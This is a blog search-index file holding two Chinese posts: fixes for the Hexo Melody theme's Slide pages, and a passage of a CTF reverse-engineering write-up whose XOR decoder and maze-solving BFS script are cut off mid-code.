<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Melody主题Slide的bug修复和魔改系列</title>
      <link href="p/blogsFor-hexo-fixedSlideBugsInMelody/"/>
      <url>p/blogsFor-hexo-fixedSlideBugsInMelody/</url>
      
        <content type="html"><![CDATA[<p>今天刚好又碰到一个Melody主题Slide页面嵌入的bug，干脆就把之前碰到的做个集合好了。</p><a id="more"></a><h1 id="页面未显示内容"><a href="#页面未显示内容" class="headerlink" title="页面未显示内容"></a>页面未显示内容</h1><p><a href="https://github.com/Molunerfinn/hexo-theme-melody/issues/320">[Issues] hljs is not defined, Reveal.initialize({dependencies:[]}) has been deprecated as of reveal.js 4.0.0. · Issue #320</a></p><p>明明这个issue关了但是主题的pug也没更新的&#x3D; &#x3D;</p><p>2021.05亲测有效</p><h1 id="图片无法显示"><a href="#图片无法显示" class="headerlink" title="图片无法显示"></a>图片无法显示</h1><p>前提：使用<a href="https://c10udlnk.top/p/blogsFor-Enjoying-hexo/#%E4%BC%98%E9%9B%85%E5%9C%B0%E5%9C%A8%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87">如何从无到有搭建属于你的hexo博客 | c10udlnk_Log</a>中的方法来优雅嵌入图片，对一般文章来说使用一切正常，但Slide中的图片无法正常插入。</p><p><img src="/p/blogsFor-hexo-fixedSlideBugsInMelody/image-20220706160716182.png"></p><p>排查发现图链嵌入有问题：</p><p><img src="/p/blogsFor-hexo-fixedSlideBugsInMelody/image-20220706160753174.png"></p><p>理论上这里的src要应该是<code>/p/blogsFor-ComSec-readingCodes/image-20211126164041910.png</code>才能正常显示。</p><p><img src="/p/blogsFor-hexo-fixedSlideBugsInMelody/image-20220706160842064.png"></p><p>其余博客文章中的正常图链嵌入便是如此：</p><p><img src="/p/blogsFor-hexo-fixedSlideBugsInMelody/image-20220706160950843.png"></p><h1 id="主页预览未更新"><a href="#主页预览未更新" class="headerlink" title="主页预览未更新"></a>主页预览未更新</h1><p>修改了该Slide的内容，但是主页的预览中并没有更新。</p><p><img src="/p/blogsFor-hexo-fixedSlideBugsInMelody/image-20220706154722810.png"></p><p>根据<a href="https://blog.csdn.net/m0_37893932/article/details/78249734">iframe的src指向的内容不刷新的解决办法之一</a>可以知道，iframe只有在src的值发生改变时，才会刷新frame里的内容。Melody嵌入iframe时只用了url，而文章url一般是不会变的。</p><p>检查可以看到iframe被放在content类。</p><p><img src="/p/blogsFor-hexo-fixedSlideBugsInMelody/image-20220706155801386.png"></p><p>通过寻找字符串定位到关键布局文件<code>.\node_modules\hexo-theme-melody\layout\includes\mixins\slide.pug</code>，将20行按如下修改，使其传一个time参数来改变url的值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mixin slideIframe(url)</span><br><span class="line">  .content</span><br><span class="line">    iframe(src&#x3D;url_for(url)+&quot;?time&#x3D;&quot;+new Date().getTime() frameborder&#x3D;&quot;0&quot;)</span><br></pre></td></tr></table></figure><p><img src="/p/blogsFor-hexo-fixedSlideBugsInMelody/image-20220706153331246.png"></p><p>【施工ing】</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> zero2one/入门 </tag>
            
            <tag> u5eful </tag>
            
            <tag> 折腾经历 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【wp】2022Sloth选拔赛</title>
      <link href="p/wpFor-2022SlothTrial/"/>
      <url>p/wpFor-2022SlothTrial/</url>
      
        <content type="html"><![CDATA[<p>上周末的Sloth选拔赛，趁着还有余温先来补补自出题的wp。</p><p>整个RE部分只有checkininin有一个解，大哭，逆向手岌岌可危（</p><p>仓库传送门：<a href="https://github.com/scnu-sloth/hsctf-2022-trial">scnu-sloth&#x2F;hsctf-2022-trial: Sloth 2022 选拔赛 题目及wp</a></p><a id="more"></a><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="checkininin"><a href="#checkininin" class="headerlink" title="checkininin"></a>checkininin</h2><p>拖进IDA里面，关键逻辑就这个（题目的三个in就取自这三个xor）</p><p><img src="/p/wpFor-2022SlothTrial/image-20220510170613229.png"></p><p>由hint给的<a href="https://mp.weixin.qq.com/s/_uLOsDpeTj91Oul9hfBUaw">HSCTF知识科普|第三期：Reverse逆向</a>可以知道，xor有一种特性是两次xor相同的数以后可以得到其本身。</p><p><img src="/p/wpFor-2022SlothTrial/image-20220510171036248.png"></p><p>当<code>s1[i] ^ v5[i] ^ v6[i] ^ v7[i] == s2[i]</code>时，s1为正确的flag。</p><p>那在<code>v5</code>、<code>v6</code>、<code>v7</code>、<code>s2</code>都是已知的情况下，用<code>s2[i] ^ v5[i] ^ v6[i] ^ v7[i]</code>即可恢复出应该为flag的s1。</p><p>然后把IDA里的伪代码复制过来改改就能拿到flag（python也可，不过需要处理一下负数问题x</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-B4h]</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-B0h]</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">32</span>]; <span class="comment">// [rsp+30h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">32</span>]; <span class="comment">// [rsp+50h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> s2[<span class="number">33</span>] = &#123;<span class="number">0</span>&#125;; <span class="comment">// [rsp+70h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="comment">// char s1[32]; // [rsp+90h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5[<span class="number">0</span>] = <span class="number">-119</span>;</span><br><span class="line">  v5[<span class="number">1</span>] = <span class="number">-85</span>;</span><br><span class="line">  v5[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  v5[<span class="number">3</span>] = <span class="number">85</span>;</span><br><span class="line">  v5[<span class="number">4</span>] = <span class="number">-23</span>;</span><br><span class="line">  v5[<span class="number">5</span>] = <span class="number">-107</span>;</span><br><span class="line">  v5[<span class="number">6</span>] = <span class="number">-58</span>;</span><br><span class="line">  v5[<span class="number">7</span>] = <span class="number">-16</span>;</span><br><span class="line">  v5[<span class="number">8</span>] = <span class="number">124</span>;</span><br><span class="line">  v5[<span class="number">9</span>] = <span class="number">-21</span>;</span><br><span class="line">  v5[<span class="number">10</span>] = <span class="number">28</span>;</span><br><span class="line">  v5[<span class="number">11</span>] = <span class="number">87</span>;</span><br><span class="line">  v5[<span class="number">12</span>] = <span class="number">43</span>;</span><br><span class="line">  v5[<span class="number">13</span>] = <span class="number">30</span>;</span><br><span class="line">  v5[<span class="number">14</span>] = <span class="number">106</span>;</span><br><span class="line">  v5[<span class="number">15</span>] = <span class="number">-18</span>;</span><br><span class="line">  v5[<span class="number">16</span>] = <span class="number">80</span>;</span><br><span class="line">  v5[<span class="number">17</span>] = <span class="number">78</span>;</span><br><span class="line">  v5[<span class="number">18</span>] = <span class="number">-55</span>;</span><br><span class="line">  v5[<span class="number">19</span>] = <span class="number">97</span>;</span><br><span class="line">  v5[<span class="number">20</span>] = <span class="number">124</span>;</span><br><span class="line">  v5[<span class="number">21</span>] = <span class="number">-86</span>;</span><br><span class="line">  v5[<span class="number">22</span>] = <span class="number">98</span>;</span><br><span class="line">  v5[<span class="number">23</span>] = <span class="number">39</span>;</span><br><span class="line">  v5[<span class="number">24</span>] = <span class="number">-74</span>;</span><br><span class="line">  v5[<span class="number">25</span>] = <span class="number">11</span>;</span><br><span class="line">  v5[<span class="number">26</span>] = <span class="number">-31</span>;</span><br><span class="line">  v5[<span class="number">27</span>] = <span class="number">35</span>;</span><br><span class="line">  v5[<span class="number">28</span>] = <span class="number">74</span>;</span><br><span class="line">  v5[<span class="number">29</span>] = <span class="number">24</span>;</span><br><span class="line">  v5[<span class="number">30</span>] = <span class="number">-61</span>;</span><br><span class="line">  v5[<span class="number">31</span>] = <span class="number">74</span>;</span><br><span class="line">  v6[<span class="number">0</span>] = <span class="number">108</span>;</span><br><span class="line">  v6[<span class="number">1</span>] = <span class="number">-124</span>;</span><br><span class="line">  v6[<span class="number">2</span>] = <span class="number">-80</span>;</span><br><span class="line">  v6[<span class="number">3</span>] = <span class="number">25</span>;</span><br><span class="line">  v6[<span class="number">4</span>] = <span class="number">-16</span>;</span><br><span class="line">  v6[<span class="number">5</span>] = <span class="number">72</span>;</span><br><span class="line">  v6[<span class="number">6</span>] = <span class="number">-5</span>;</span><br><span class="line">  v6[<span class="number">7</span>] = <span class="number">-61</span>;</span><br><span class="line">  v6[<span class="number">8</span>] = <span class="number">-115</span>;</span><br><span class="line">  v6[<span class="number">9</span>] = <span class="number">-120</span>;</span><br><span class="line">  v6[<span class="number">10</span>] = <span class="number">122</span>;</span><br><span class="line">  v6[<span class="number">11</span>] = <span class="number">109</span>;</span><br><span class="line">  v6[<span class="number">12</span>] = <span class="number">-37</span>;</span><br><span class="line">  v6[<span class="number">13</span>] = <span class="number">-87</span>;</span><br><span class="line">  v6[<span class="number">14</span>] = <span class="number">92</span>;</span><br><span class="line">  v6[<span class="number">15</span>] = <span class="number">8</span>;</span><br><span class="line">  v6[<span class="number">16</span>] = <span class="number">10</span>;</span><br><span class="line">  v6[<span class="number">17</span>] = <span class="number">69</span>;</span><br><span class="line">  v6[<span class="number">18</span>] = <span class="number">0x80</span>;</span><br><span class="line">  v6[<span class="number">19</span>] = <span class="number">-27</span>;</span><br><span class="line">  v6[<span class="number">20</span>] = <span class="number">10</span>;</span><br><span class="line">  v6[<span class="number">21</span>] = <span class="number">14</span>;</span><br><span class="line">  v6[<span class="number">22</span>] = <span class="number">-74</span>;</span><br><span class="line">  v6[<span class="number">23</span>] = <span class="number">-96</span>;</span><br><span class="line">  v6[<span class="number">24</span>] = <span class="number">-53</span>;</span><br><span class="line">  v6[<span class="number">25</span>] = <span class="number">30</span>;</span><br><span class="line">  v6[<span class="number">26</span>] = <span class="number">-4</span>;</span><br><span class="line">  v6[<span class="number">27</span>] = <span class="number">114</span>;</span><br><span class="line">  v6[<span class="number">28</span>] = <span class="number">-115</span>;</span><br><span class="line">  v6[<span class="number">29</span>] = <span class="number">84</span>;</span><br><span class="line">  v6[<span class="number">30</span>] = <span class="number">-42</span>;</span><br><span class="line">  v6[<span class="number">31</span>] = <span class="number">23</span>;</span><br><span class="line">  v7[<span class="number">0</span>] = <span class="number">-96</span>;</span><br><span class="line">  v7[<span class="number">1</span>] = <span class="number">103</span>;</span><br><span class="line">  v7[<span class="number">2</span>] = <span class="number">68</span>;</span><br><span class="line">  v7[<span class="number">3</span>] = <span class="number">-101</span>;</span><br><span class="line">  v7[<span class="number">4</span>] = <span class="number">121</span>;</span><br><span class="line">  v7[<span class="number">5</span>] = <span class="number">-23</span>;</span><br><span class="line">  v7[<span class="number">6</span>] = <span class="number">-65</span>;</span><br><span class="line">  v7[<span class="number">7</span>] = <span class="number">111</span>;</span><br><span class="line">  v7[<span class="number">8</span>] = <span class="number">-96</span>;</span><br><span class="line">  v7[<span class="number">9</span>] = <span class="number">-126</span>;</span><br><span class="line">  v7[<span class="number">10</span>] = <span class="number">46</span>;</span><br><span class="line">  v7[<span class="number">11</span>] = <span class="number">-120</span>;</span><br><span class="line">  v7[<span class="number">12</span>] = <span class="number">-123</span>;</span><br><span class="line">  v7[<span class="number">13</span>] = <span class="number">109</span>;</span><br><span class="line">  v7[<span class="number">14</span>] = <span class="number">-11</span>;</span><br><span class="line">  v7[<span class="number">15</span>] = <span class="number">27</span>;</span><br><span class="line">  v7[<span class="number">16</span>] = <span class="number">-95</span>;</span><br><span class="line">  v7[<span class="number">17</span>] = <span class="number">-7</span>;</span><br><span class="line">  v7[<span class="number">18</span>] = <span class="number">30</span>;</span><br><span class="line">  v7[<span class="number">19</span>] = <span class="number">55</span>;</span><br><span class="line">  v7[<span class="number">20</span>] = <span class="number">127</span>;</span><br><span class="line">  v7[<span class="number">21</span>] = <span class="number">-4</span>;</span><br><span class="line">  v7[<span class="number">22</span>] = <span class="number">-69</span>;</span><br><span class="line">  v7[<span class="number">23</span>] = <span class="number">35</span>;</span><br><span class="line">  v7[<span class="number">24</span>] = <span class="number">-74</span>;</span><br><span class="line">  v7[<span class="number">25</span>] = <span class="number">125</span>;</span><br><span class="line">  v7[<span class="number">26</span>] = <span class="number">7</span>;</span><br><span class="line">  v7[<span class="number">27</span>] = <span class="number">117</span>;</span><br><span class="line">  v7[<span class="number">28</span>] = <span class="number">-113</span>;</span><br><span class="line">  v7[<span class="number">29</span>] = <span class="number">-112</span>;</span><br><span class="line">  v7[<span class="number">30</span>] = <span class="number">-13</span>;</span><br><span class="line">  v7[<span class="number">31</span>] = <span class="number">121</span>;</span><br><span class="line">  s2[<span class="number">0</span>] = <span class="number">45</span>;</span><br><span class="line">  s2[<span class="number">1</span>] = <span class="number">59</span>;</span><br><span class="line">  s2[<span class="number">2</span>] = <span class="number">-105</span>;</span><br><span class="line">  s2[<span class="number">3</span>] = <span class="number">-93</span>;</span><br><span class="line">  s2[<span class="number">4</span>] = <span class="number">6</span>;</span><br><span class="line">  s2[<span class="number">5</span>] = <span class="number">79</span>;</span><br><span class="line">  s2[<span class="number">6</span>] = <span class="number">-35</span>;</span><br><span class="line">  s2[<span class="number">7</span>] = <span class="number">14</span>;</span><br><span class="line">  s2[<span class="number">8</span>] = <span class="number">98</span>;</span><br><span class="line">  s2[<span class="number">9</span>] = <span class="number">-43</span>;</span><br><span class="line">  s2[<span class="number">10</span>] = <span class="number">4</span>;</span><br><span class="line">  s2[<span class="number">11</span>] = <span class="number">-2</span>;</span><br><span class="line">  s2[<span class="number">12</span>] = <span class="number">44</span>;</span><br><span class="line">  s2[<span class="number">13</span>] = <span class="number">-123</span>;</span><br><span class="line">  s2[<span class="number">14</span>] = <span class="number">-100</span>;</span><br><span class="line">  s2[<span class="number">15</span>] = <span class="number">-72</span>;</span><br><span class="line">  s2[<span class="number">16</span>] = <span class="number">-95</span>;</span><br><span class="line">  s2[<span class="number">17</span>] = <span class="number">-83</span>;</span><br><span class="line">  s2[<span class="number">18</span>] = <span class="number">8</span>;</span><br><span class="line">  s2[<span class="number">19</span>] = <span class="number">-20</span>;</span><br><span class="line">  s2[<span class="number">20</span>] = <span class="number">81</span>;</span><br><span class="line">  s2[<span class="number">21</span>] = <span class="number">23</span>;</span><br><span class="line">  s2[<span class="number">22</span>] = <span class="number">61</span>;</span><br><span class="line">  s2[<span class="number">23</span>] = <span class="number">-21</span>;</span><br><span class="line">  s2[<span class="number">24</span>] = <span class="number">-103</span>;</span><br><span class="line">  s2[<span class="number">25</span>] = <span class="number">39</span>;</span><br><span class="line">  s2[<span class="number">26</span>] = <span class="number">72</span>;</span><br><span class="line">  s2[<span class="number">27</span>] = <span class="number">5</span>;</span><br><span class="line">  s2[<span class="number">28</span>] = <span class="number">105</span>;</span><br><span class="line">  s2[<span class="number">29</span>] = <span class="number">-3</span>;</span><br><span class="line">  s2[<span class="number">30</span>] = <span class="number">-71</span>;</span><br><span class="line">  s2[<span class="number">31</span>] = <span class="number">89</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    s2[i] ^= v5[i];</span><br><span class="line">    s2[i] ^= v6[i];</span><br><span class="line">    s2[i] ^= v7[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, s2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2022SlothTrial/image-20220510171543804.png"></p><p>真·逆向签到题。</p><h2 id="3ZVW"><a href="#3ZVW" class="headerlink" title="3ZVW"></a>3ZVW</h2><p>hints给了一个<a href="https://ctf-wiki.org/reverse/maze/maze/">迷宫题</a>的wiki，其实看代码也能看出来是迷宫。而且题目名字上下颠倒再倒着读不就是MAZE嘛~（逃</p><p>很明显只有<code>sub_7D1()</code>这一个check，稍微分析一下（考验IDA快捷键的熟练运用）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_7D1</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+1Dh] [rbp-13h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v5; <span class="comment">// [rsp+1Eh] [rbp-12h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 i; <span class="comment">// [rsp+1Fh] [rbp-11h]</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">4</span>][<span class="number">2</span>]; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(a1, <span class="string">&quot;hsctf&#123;&quot;</span>, <span class="number">6u</span>LL) || a1[<span class="number">37</span>] != <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  v7[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v7[<span class="number">0</span>][<span class="number">1</span>] = <span class="number">-1</span>;</span><br><span class="line">  v7[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">  v7[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v7[<span class="number">2</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v7[<span class="number">2</span>][<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">  v7[<span class="number">3</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  v7[<span class="number">3</span>][<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">1</span>;</span><br><span class="line">  v4 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">6</span>; i &lt;= <span class="number">0x24</span>u; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = (<span class="keyword">char</span>)a1[i];</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="string">&#x27;j&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v2 &gt; <span class="string">&#x27;j&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v2 == <span class="string">&#x27;k&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v2 != <span class="string">&#x27;l&#x27;</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">        v5 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v2 != <span class="string">&#x27;h&#x27;</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">      v5 = <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( ((maze[v3][v4] &gt;&gt; v5) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    v3 += v7[<span class="number">3</span> - v5][<span class="number">0</span>];</span><br><span class="line">    v4 += v7[<span class="number">3</span> - v5][<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> ( (maze[v3][v4] &amp; <span class="number">0x10</span>) != <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>明显，v7是一个二维数组<code>&#123;&#123;0, -1&#125;, &#123;-1, 0&#125;, &#123;0, 1&#125;, &#123;1, 0&#125;&#125;</code>，是用来指定方向的；v5是一个临时值，由根据flag的字符赋值（flag中间值必为<code>hjkl</code>中的一个），根据maze的对应值判断能不能过check。</p><p>v3是x，v4是y，maze题型参考前年新生赛<a href="https://c10udlnk.top/p/wpFor-2020HSCTF/#0x04-maze">【wp】2020HSCTF_PC逆向 | c10udlnk_Log</a>，有一点不同的是这一次maze不是存每个点是墙还是路，而是存四周的情况，比如v5&#x3D;3（即当前值为<code>h</code>）时，就判断<code>(maze[v3][v4] &gt;&gt; v5)</code>（二进制的第3位）是不是1，是的话（二进制为<code>1xxx</code>）说明没有墙，可以通过；否的话（二进制为<code>0xxx</code>）说明有墙，不可通过。</p><p>二进制的第4位为1说明这个点是终点，第0&#x2F;1&#x2F;2&#x2F;3位代表当前点往左&#x2F;上&#x2F;右&#x2F;下的情况。</p><p>存四周的情况下，画图其实是不好画的（也能画，但是懒），考虑到是选拔赛难度所以把迷宫规格加到了18*18，exp可以写一个bfs自动走迷宫就好了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getVal</span>(<span class="params">arr, t</span>):</span></span><br><span class="line">    <span class="keyword">return</span> arr[t[<span class="number">0</span>]][t[<span class="number">1</span>]]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">walkMaze</span>(<span class="params">maze_data, lens, start, end</span>):</span></span><br><span class="line">    dirs = [(<span class="number">0</span>,<span class="number">-1</span>), (<span class="number">-1</span>,<span class="number">0</span>), (<span class="number">0</span>,<span class="number">1</span>), (<span class="number">1</span>,<span class="number">0</span>)]</span><br><span class="line">    FLAG_CHAR = [<span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;j&#x27;</span>]</span><br><span class="line">    path = [start]</span><br><span class="line">    step = [[<span class="string">&quot;&quot;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(lens)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(lens)]</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(path) != <span class="number">0</span>:</span><br><span class="line">        prev = path[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">del</span> path[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            cur = (prev[<span class="number">0</span>]+dirs[i][<span class="number">0</span>], prev[<span class="number">1</span>]+dirs[i][<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">if</span> getVal(maze_data, prev)&amp;(<span class="number">1</span>&lt;&lt;(<span class="number">3</span>-i)) != <span class="number">0</span> <span class="keyword">and</span> getVal(step, cur) == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                step[cur[<span class="number">0</span>]][cur[<span class="number">1</span>]] = getVal(step, prev) + FLAG_CHAR[i]</span><br><span class="line">                path.append(cur)</span><br><span class="line">    <span class="keyword">return</span> getVal(step, 